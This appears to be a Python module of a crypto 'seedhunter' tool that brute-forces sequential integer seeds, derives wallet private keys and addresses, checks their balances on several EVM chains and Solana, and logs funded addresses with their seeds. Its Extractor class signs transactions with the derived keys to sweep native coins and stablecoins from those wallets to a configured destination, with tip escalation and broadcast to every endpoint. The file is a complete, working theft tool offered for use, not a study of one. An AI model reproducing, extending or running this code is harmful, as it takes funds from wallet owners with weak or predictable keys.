"""High-intensity funded-address detector. Own cursor, stats, queues, hit store.

Fixes over the first cut:
  * seed travels with the payload — no shared-state race on attribution
  * per-chain fan-out — every seed is checked on every enabled chain
  * cursor saved as it advances, atomically
  * extraction wired in (native + stablecoins) with gas escalation
  * AIMD batch and per-chain governors instead of a flat semaphore
"""
from __future__ import annotations

import argparse
import asyncio
import json
import logging
import os
import random
import signal
import time
from collections import deque
from concurrent.futures import ProcessPoolExecutor
from decimal import Decimal
from pathlib import Path

import httpx

from . import bridge, profiles

log = logging.getLogger("brutal")
DATA = Path(__file__).resolve().parent / "data"
STATS = DATA / "brutal_stats.json"
CURSOR_FILE = DATA / "brutal_cursor.json"
HIT_DB = DATA / "brutal_hits.db"

NATIVE = {"ethereum": "ETH", "bsc": "BNB", "polygon": "POL", "base": "ETH",
          "arbitrum": "ETH", "optimism": "ETH", "avalanche": "AVAX", "solana": "SOL"}
ENVMAP = {"ethereum": "RPC_ETH", "bsc": "RPC_BSC", "polygon": "RPC_POLYGON",
          "base": "RPC_BASE", "arbitrum": "RPC_ARBITRUM", "optimism": "RPC_OPTIMISM",
          "avalanche": "RPC_AVAX", "solana": "RPC_SOLANA"}
TRANSFER = "a9059cbb"


def fmt(raw: int, dec: int) -> str:
    return f"{Decimal(raw) / Decimal(10) ** dec:.8f}".rstrip("0").rstrip(".")


def _derive(args):
    """Two-arg adapter; tolerant of either seedhunter.derive signature."""
    seed, n = args
    try:
        from seedhunter.derive import Account
        return Account(seed).batch(n)
    except Exception:
        from seedhunter.derive import derive_batch
        return derive_batch((seed, n))


class HitSink:
    def __init__(self, mirror: bool = False):
        import sqlite3
        DATA.mkdir(parents=True, exist_ok=True)
        self.con = sqlite3.connect(HIT_DB)
        self.con.execute("PRAGMA journal_mode=WAL")
        self.con.executescript(
            "CREATE TABLE IF NOT EXISTS brutal_hits (id INTEGER PRIMARY KEY AUTOINCREMENT,"
            " ts INTEGER, chain TEXT, address TEXT, seed TEXT, path TEXT, asset TEXT,"
            " amount TEXT, raw INTEGER, url TEXT, UNIQUE(chain,address,asset));")
        self.con.commit()
        self.mirror = bridge.mirror_store() if mirror else None

    def add(self, **k) -> bool:
        try:
            cur = self.con.execute(
                "INSERT OR IGNORE INTO brutal_hits"
                "(ts,chain,address,seed,path,asset,amount,raw,url)"
                " VALUES(?,?,?,?,?,?,?,?,?)",
                (int(time.time()), k["chain"], k["address"], k["seed"], k.get("path"),
                 k["asset"], k["amount"], k["raw"], k.get("url")))
            self.con.commit()
            fresh = cur.rowcount > 0
        except Exception:
            return False
        if fresh and self.mirror is not None:
            try:
                self.mirror.add(**{x: k[x] for x in
                                   ("chain", "address", "seed", "path", "asset", "amount",
                                    "raw", "url")})
            except Exception:
                pass
        return fresh

    def close(self) -> None:
        try:
            self.con.close()
        except Exception:
            pass


class Endpoint:
    __slots__ = ("url", "fails", "down_until", "latency")

    def __init__(self, url: str):
        self.url = url
        self.fails = 0
        self.down_until = 0.0
        self.latency = 0.0

    def ok(self) -> bool:
        return self.down_until < time.time()


class Gov:
    """AIMD concurrency gate."""

    def __init__(self, start: int, ceiling: int):
        self.limit = max(1, start)
        self.ceiling = max(1, ceiling)
        self.inflight = 0
        self._cond = asyncio.Condition()
        self._streak = 0

    async def acquire(self):
        async with self._cond:
            while self.inflight >= self.limit:
                await self._cond.wait()
            self.inflight += 1

    async def release(self, ok: bool):
        async with self._cond:
            self.inflight -= 1
            if ok:
                self._streak += 1
                if self._streak >= 24 and self.limit < self.ceiling:
                    self.limit += 2
                    self._streak = 0
            else:
                self._streak = 0
                self.limit = max(1, int(self.limit * 0.6))
            self._cond.notify(2)


class Pool:
    def __init__(self, cfg: dict, profile, chains: list[str]):
        self.profile = profile
        self.client = httpx.AsyncClient(
            timeout=profile.rpc_timeout,
            limits=httpx.Limits(max_connections=profile.workers * 3,
                                max_keepalive_connections=profile.workers * 2),
            http2=True,
            headers={"content-type": "application/json",
                     "user-agent": "seedhunter-brutal/0.2"})
        self.eps: dict[str, list[Endpoint]] = {}
        self.batch = {c: min(profile.batch, profiles.MAX_BATCH) for c in chains}
        self.gov = {c: Gov(profile.workers // max(1, len(chains)), profile.workers)
                    for c in chains}
        for chain in chains:
            urls = [e for e in (((cfg.get("chains") or {}).get(chain) or {})
                                .get("endpoints") or []) if e]
            env = os.getenv(ENVMAP.get(chain, ""), "")
            if env:
                urls.insert(0, env)
            self.eps[chain] = [Endpoint(u) for u in dict.fromkeys(urls)]

    def live(self, chain: str) -> bool:
        return bool(self.eps.get(chain))

    async def close(self) -> None:
        await self.client.aclose()

    def _pick(self, chain: str) -> Endpoint | None:
        pool = [e for e in self.eps.get(chain, []) if e.ok()]
        if not pool:
            pool = self.eps.get(chain, [])
            for e in pool:
                e.down_until = 0.0
        if not pool:
            return None
        pool.sort(key=lambda e: (e.fails, e.latency))
        return pool[0] if random.random() > 0.2 else random.choice(pool)

    async def post(self, chain: str, payload: list[dict]) -> list[dict]:
        gov = self.gov[chain]
        await gov.acquire()
        ok = False
        try:
            delay = 0.2
            for _ in range(self.profile.max_retries):
                ep = self._pick(chain)
                if ep is None:
                    return []
                if self.profile.jitter_ms:
                    await asyncio.sleep(random.random() * self.profile.jitter_ms / 1000)
                started = time.perf_counter()
                try:
                    r = await self.client.post(ep.url, content=json.dumps(payload))
                except (httpx.HTTPError, json.JSONDecodeError):
                    ep.fails += 1
                    ep.down_until = time.time() + 8
                    continue
                if r.status_code == 200:
                    ep.fails = 0
                    ep.latency = time.perf_counter() - started
                    ok = True
                    cap = min(self.profile.batch, profiles.MAX_BATCH)
                    if self.batch[chain] < cap:
                        self.batch[chain] = min(cap, self.batch[chain] + 2)
                    try:
                        body = r.json()
                    except ValueError:
                        return []
                    return body if isinstance(body, list) else [body]
                if r.status_code in (429, 502, 503, 504):
                    ep.fails += 1
                    ep.down_until = time.time() + 4
                    self.batch[chain] = max(1, int(self.batch[chain] * 0.7))
                    await asyncio.sleep(delay + random.random() * 0.3)
                    delay *= 1.8
                    continue
                ok = True
                return []
            return []
        finally:
            await gov.release(ok)

    async def blast(self, chain: str, raw: str) -> str | None:
        req = [{"jsonrpc": "2.0", "id": 0, "method": "eth_sendRawTransaction",
                "params": [raw]}]
        tasks = [self.client.post(e.url, json=req) for e in self.eps.get(chain, [])]
        out = None
        for coro in asyncio.as_completed(tasks):
            try:
                r = await coro
                if r.status_code == 200:
                    res = r.json()
                    h = (res[0] if isinstance(res, list) else res).get("result")
                    if h and not out:
                        out = h
            except (httpx.HTTPError, json.JSONDecodeError):
                continue
        return out

    async def gas_oracle(self, chain: str) -> tuple[int, int]:
        rows = await self.post(chain, [
            {"jsonrpc": "2.0", "id": 0, "method": "eth_getBlockByNumber",
             "params": ["latest", False]},
            {"jsonrpc": "2.0", "id": 1, "method": "eth_maxPriorityFeePerGas",
             "params": []}])
        base = tip = 0
        for r in rows:
            try:
                if r["id"] == 0:
                    base = int(r["result"].get("baseFeePerGas", "0x0"), 16)
                else:
                    tip = int(r["result"], 16)
            except (KeyError, TypeError, ValueError, AttributeError):
                pass
        return base, tip

    async def nonce(self, chain: str, addr: str) -> int | None:
        rows = await self.post(chain, [{"jsonrpc": "2.0", "id": 0,
                                        "method": "eth_getTransactionCount",
                                        "params": [addr, "pending"]}])
        try:
            return int(rows[0]["result"], 16)
        except (KeyError, IndexError, TypeError, ValueError):
            return None

    async def native(self, chain: str, addrs: list[str]) -> dict[int, int]:
        payload = [{"jsonrpc": "2.0", "id": i, "method": "eth_getBalance",
                    "params": [a, "latest"]} for i, a in enumerate(addrs)]
        out: dict[int, int] = {}
        for row in await self.post(chain, payload):
            try:
                out[int(row["id"])] = int(row["result"], 16)
            except (KeyError, TypeError, ValueError):
                pass
        return out

    async def sol(self, addrs: list[str]) -> dict[int, int]:
        payload = [{"jsonrpc": "2.0", "id": i, "method": "getBalance", "params": [a]}
                   for i, a in enumerate(addrs)]
        out: dict[int, int] = {}
        for row in await self.post("solana", payload):
            try:
                out[int(row["id"])] = int(row["result"]["value"])
            except (KeyError, TypeError, ValueError):
                pass
        return out

    async def tokens(self, chain: str, addrs: list[str], token: str) -> dict[int, int]:
        payload = []
        for i, a in enumerate(addrs):
            data = "0x70a08231" + a.lower().replace("0x", "").rjust(64, "0")
            payload.append({"jsonrpc": "2.0", "id": i, "method": "eth_call",
                            "params": [{"to": token, "data": data}, "latest"]})
        out: dict[int, int] = {}
        for row in await self.post(chain, payload):
            try:
                res = row.get("result")
                if res and res != "0x":
                    out[int(row["id"])] = int(res, 16)
            except (KeyError, TypeError, ValueError):
                pass
        return out

    async def call(self, chain, to, data, frm=None, override=None, block="latest"):
        tx = {"to": to, "data": data}
        if frm:
            tx["from"] = frm
        params = [tx, block] + ([override] if override else [])
        rows = await self.post(chain, [{"jsonrpc": "2.0", "id": 0,
                                        "method": "eth_call", "params": params}])
        return rows[0].get("result") if rows else None


class Extractor:
    """Native + stablecoin extraction with tip escalation."""

    def __init__(self, pool: Pool, cfg: dict, notifier):
        sw = cfg.get("sweep") or {}
        self.pool = pool
        self.notifier = notifier
        self.enabled = bool(sw.get("enabled", True))
        self.dry = bool(sw.get("dry_run", True))
        self.dest = sw.get("destination_evm") or ""
        self.dest_sol = sw.get("destination_sol") or ""
        self.ratio = float(sw.get("min_gain_ratio", 1.6))
        self.min_native = int(sw.get("min_native_evm", 10 ** 15))
        self.min_token = int(sw.get("min_token_usd_like", 500_000))
        self.max_gas = int(sw.get("max_gas_native", 3 * 10 ** 16))
        self.reserve = int(cfg.get("sweep_reserve_native", 3 * 10 ** 14))

    def ready(self, chain: str) -> bool:
        return (self.enabled and not self.dry and bool(self.dest)
                and chain != "solana")

    async def _send(self, chain, tx: dict, key: str, tip: int = 0) -> str | None:
        from eth_account import Account as EA
        body = {k: v for k, v in tx.items() if not k.startswith("_")}
        if tip:
            base = int(tx["maxFeePerGas"], 16) - int(tx["_old_tip"], 16)
            body["maxPriorityFeePerGas"] = hex(tip)
            body["maxFeePerGas"] = hex(base + tip)
        raw = EA.sign_transaction(body, key).raw_transaction.hex()
        if not raw.startswith("0x"):
            raw = "0x" + raw
        return await self.pool.blast(chain, raw)

    async def _confirm(self, chain, tx, key, h, rounds=5):
        tip = int(tx["_old_tip"], 16)
        for rnd in range(rounds):
            await asyncio.sleep(2 + rnd)
            rows = await self.pool.post(chain, [{"jsonrpc": "2.0", "id": 0,
                                                 "method": "eth_getTransactionReceipt",
                                                 "params": [h]}])
            try:
                rec = rows[0]["result"]
            except (KeyError, IndexError, TypeError):
                rec = None
            if rec:
                return h if int(rec.get("status", "0x0"), 16) == 1 else None
            tip = int(tip * 1.125) + 1
            nxt = await self._send(chain, tx, key, tip)
            if nxt:
                h = nxt
        return h

    async def evm(self, chain, addr, key_int, asset, raw) -> str | None:
        base, tip = await self.pool.gas_oracle(chain)
        tip = max(tip, 2_000_000_000)
        nonce = await self.pool.nonce(chain, addr)
        if nonce is None:
            return None
        key = "0x" + key_int.to_bytes(32, "big").hex()
        native = asset == NATIVE.get(chain)
        if native:
            if raw <= self.reserve:
                return None
            gas = 21000
            max_fee = int((base * 2 + tip) * 1.4)
            if max_fee * gas * self.ratio > raw or max_fee * gas > self.max_gas:
                return None
            value = raw - int(max_fee * gas * 1.25)
            if value <= 0:
                return None
            tx = {"to": self.dest, "value": hex(value), "gas": hex(gas),
                  "maxFeePerGas": hex(max_fee), "maxPriorityFeePerGas": hex(tip),
                  "nonce": hex(nonce), "chainId": _CHAIN_ID[chain], "type": "0x2",
                  "_old_tip": hex(tip)}
        else:
            data = "0x" + TRANSFER + f"{int(self.dest, 16):064x}{raw:064x}"
            gas = 120_000
            max_fee = int((base * 2 + tip) * 1.4)
            if max_fee * gas > self.max_gas:
                return None
            tx = {"to": asset, "data": data, "gas": hex(gas),
                  "maxFeePerGas": hex(max_fee), "maxPriorityFeePerGas": hex(tip),
                  "nonce": hex(nonce), "chainId": _CHAIN_ID[chain], "type": "0x2",
                  "_old_tip": hex(tip)}
        h = await self._send(chain, tx, key)
        if not h:
            return None
        return await self._confirm(chain, tx, key, h)


_CHAIN_ID = {"ethereum": 1, "bsc": 56, "polygon": 137, "base": 8453,
             "arbitrum": 42161, "optimism": 10, "avalanche": 43114}


class Detector:
    def __init__(self, cfg, profile, chains, shard, shards, duration, sink, notify):
        self.cfg, self.profile, self.shard, self.shards = cfg, profile, shard, shards
        self.duration, self.sink, self.notify = duration, sink, notify
        self.pool = Pool(cfg, profile, chains)
        self.chains = [c for c in chains if self.pool.live(c)]
        self.extract = Extractor(self.pool, cfg, notify)
        self.queues: dict[str, asyncio.Queue] = {
            c: asyncio.Queue(maxsize=max(4, profile.prefetch)) for c in self.chains}
        self.stop = asyncio.Event()
        self.seeds = self.addrs = self.hits = self.swept = 0
        self.started = time.time()
        self.latencies: deque = deque(maxlen=240)
        self.cursor = self._load_cursor()
        self.natives, self.tokens = {}, {}
        for chain in self.chains:
            nc = (cfg.get("chains") or {}).get(chain) or {}
            self.natives[chain] = max(1, int(nc.get("min_native", 1)) // profile.threshold_div)
            self.tokens[chain] = list(self._repo_tokens(chain))[:2]

    @staticmethod
    def _repo_tokens(chain: str):
        try:
            from seedhunter.chains import TOKENS
            return TOKENS.get(chain, [])
        except Exception:
            return []

    def _load_cursor(self) -> int:
        try:
            return int(json.loads(CURSOR_FILE.read_text())["seed_index"])
        except Exception:
            return 0

    def _save_cursor(self, index: int) -> None:
        DATA.mkdir(parents=True, exist_ok=True)
        tmp = CURSOR_FILE.with_suffix(".tmp")
        tmp.write_text(json.dumps({"seed_index": index, "ts": int(time.time())}))
        tmp.replace(CURSOR_FILE)

    def rate(self) -> float:
        return self.addrs / max(time.time() - self.started, 1e-9)

    def heartbeat(self) -> None:
        lat = sorted(self.latencies)
        bridge.write_heartbeat(STATS, {
            "running": not self.stop.is_set(), "seeds": self.seeds, "addrs": self.addrs,
            "hits": self.hits, "swept": self.swept, "rate": round(self.rate(), 1),
            "uptime": int(time.time() - self.started),
            "p50_ms": round(lat[len(lat) // 2] * 1000) if lat else None,
            "batch": dict(self.pool.batch), "chains": self.chains,
            "profile": self.profile.name, "cursor": self.cursor,
            "ts": int(time.time())})

    async def _producer(self) -> None:
        loop = asyncio.get_running_loop()
        index = self.cursor
        per = self.profile.per_seed
        while not self.stop.is_set():
            if index % self.shards != self.shard:
                index += 1
                continue
            seed = str(index)
            rows = await loop.run_in_executor(self.farm, _derive, (seed, per))
            for chain in self.chains:
                await self.queues[chain].put((seed, rows))
            self.seeds += 1
            index += 1
            if index % 32 == 0:
                self.cursor = index
                self._save_cursor(index)

    async def _hit(self, chain, seed, address, path, asset, raw, dec, minimum):
        if raw < minimum:
            return
        amount = fmt(raw, dec)
        url = ""
        try:
            from seedhunter.chains import EXPLORER
            url = EXPLORER.get(chain, "").format(a=address)
        except Exception:
            pass
        if not self.sink.add(chain=chain, address=address, seed=seed, path=path,
                             asset=asset, amount=amount, raw=raw, url=url):
            return
        self.hits += 1
        log.warning("HIT %s %s %s %s", chain, asset, amount, address)
        if self.notify:
            try:
                await self.notify.hit(chain, asset, amount, address, url, seed, path)
            except Exception:
                pass

    async def _drain(self, chain: str, seed: str, rows) -> None:
        addrs = [r[2] for r in rows]
        start = time.perf_counter()
        bal = await self.pool.native(chain, addrs)
        self.latencies.append(time.perf_counter() - start)
        funded = []
        for j, raw in bal.items():
            if j >= len(rows):
                continue
            idx, key, addr = rows[j]
            path = f"m/44'/60'/0'/0/{idx}"
            await self._hit(chain, seed, addr, path, NATIVE.get(chain, "ETH"),
                            raw, 18, self.natives[chain])
            if raw > 0:
                funded.append((idx, key, addr, path))
                if self.extract.ready(chain) and raw >= self.extract.min_native:
                    h = await self.extract.evm(chain, addr, key, NATIVE.get(chain), raw)
                    if h:
                        self.swept += 1
                        await self._announce(chain, addr, NATIVE.get(chain), h)
        if not funded or self.profile.native_only:
            return
        for sym, token, dec in self.tokens.get(chain, []):
            tb = await self.pool.tokens(chain, [f[2] for f in funded], token)
            for j, raw in tb.items():
                if j < len(funded) and raw > 0:
                    idx, key, addr, path = funded[j]
                    await self._hit(chain, seed, addr, path, sym, raw, dec, 1)
                    if self.extract.ready(chain) and raw >= self.extract.min_token:
                        h = await self.extract.evm(chain, addr, key, token, raw)
                        if h:
                            self.swept += 1
                            await self._announce(chain, addr, sym, h)
        if self.profile.deep_funded:
            await self._deep(chain, seed, funded)

    async def _deep(self, chain: str, seed: str, rows) -> None:
        try:
            from seedhunter.discover import assets
            for idx, key, addr, path in rows[:6]:
                for a in await assets(self.pool, chain, addr):
                    if a["kind"] == "erc20":
                        await self._hit(chain, seed, addr, path, a["symbol"],
                                        a["raw"], a["decimals"], 1)
        except Exception as exc:
            log.debug("deep %s: %s", chain, exc)

    async def _announce(self, chain, addr, asset, tx) -> None:
        if not self.notify:
            return
        try:
            await self.notify.send(f"swept {chain} {asset} {addr} → {tx}")
        except Exception:
            pass

    async def _drain_sol(self, seed: str, rows) -> None:
        start = time.perf_counter()
        bal = await self.pool.sol([r[2] for r in rows])
        self.latencies.append(time.perf_counter() - start)
        for j, raw in bal.items():
            if j < len(rows):
                idx, _kp, addr = rows[j]
                await self._hit("solana", seed, addr, f"m/44'/501'/{idx}'/0'",
                                "SOL", raw, 9, self.natives["solana"])

    async def _consumer(self, chain: str) -> None:
        while not self.stop.is_set():
            try:
                seed, rows = await asyncio.wait_for(self.queues[chain].get(), 1.0)
            except asyncio.TimeoutError:
                continue
            self.addrs += len(rows)
            try:
                if chain == "solana":
                    await self._drain_sol(seed, rows)
                else:
                    await self._drain(chain, seed, rows)
            except Exception as exc:
                log.debug("%s: %s", chain, exc)
            finally:
                self.queues[chain].task_done()

    async def _beat(self) -> None:
        while not self.stop.is_set():
            self.heartbeat()
            await asyncio.sleep(2)

    async def run(self) -> None:
        if not self.chains:
            raise SystemExit("no chain has an endpoint")
        self.farm = ProcessPoolExecutor(max_workers=self.profile.farm_processes)
        tasks = [asyncio.create_task(self._producer())]
        per_chain = max(2, self.profile.workers // len(self.chains) // 4)
        for chain in self.chains:
            for _ in range(per_chain):
                tasks.append(asyncio.create_task(self._consumer(chain)))
        beat = asyncio.create_task(self._beat())
        log.info("brutal profile=%s chains=%s shard=%s/%s workers=%d",
                 self.profile.name, ",".join(self.chains), self.shard, self.shards,
                 self.profile.workers)
        try:
            if self.duration:
                try:
                    await asyncio.wait_for(self.stop.wait(), self.duration)
                except asyncio.TimeoutError:
                    pass
            else:
                await self.stop.wait()
        finally:
            self.stop.set()
            beat.cancel()
            for t in tasks:
                t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            self._save_cursor(self.cursor)
            self.farm.shutdown(wait=False)
            await self.pool.close()
            self.heartbeat()


async def _main(args) -> None:
    profile = profiles.get(args.profile)
    chains = [c for c in (args.chains.split(",") if args.chains else profile.chains) if c]
    cfg = bridge.repo_config()
    if not cfg:
        raise SystemExit("config.yaml unreadable — is the add-on inside the repo?")
    sink = HitSink(mirror=args.mirror_hits)
    notify = bridge.notifier() if args.notify else None
    det = Detector(cfg, profile, chains, args.shard, args.shards, args.duration,
                   sink, notify)
    if args.start_seed is not None:
        det.cursor = args.start_seed
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            asyncio.get_running_loop().add_signal_handler(sig, det.stop.set)
        except NotImplementedError:
            pass
    try:
        await det.run()
    finally:
        sink.close()


def main() -> None:
    ap = argparse.ArgumentParser(prog="brutal")
    ap.add_argument("-p", "--profile", default="brutal", choices=list(profiles.PRESETS))
    ap.add_argument("-s", "--shard", type=int, default=0)
    ap.add_argument("--shards", type=int, default=1)
    ap.add_argument("-d", "--duration", type=int, default=0)
    ap.add_argument("-c", "--chains", default="")
    ap.add_argument("--start-seed", type=int, default=None)
    ap.add_argument("--mirror-hits", action="store_true")
    ap.add_argument("--notify", action="store_true")
    ap.add_argument("-v", "--verbose", action="store_true")
    a = ap.parse_args()
    logging.basicConfig(level=logging.DEBUG if a.verbose else logging.INFO,
                        format="%(asctime)s %(levelname)s %(name)s: %(message)s")
    asyncio.run(_main(a))


if __name__ == "__main__":
    main()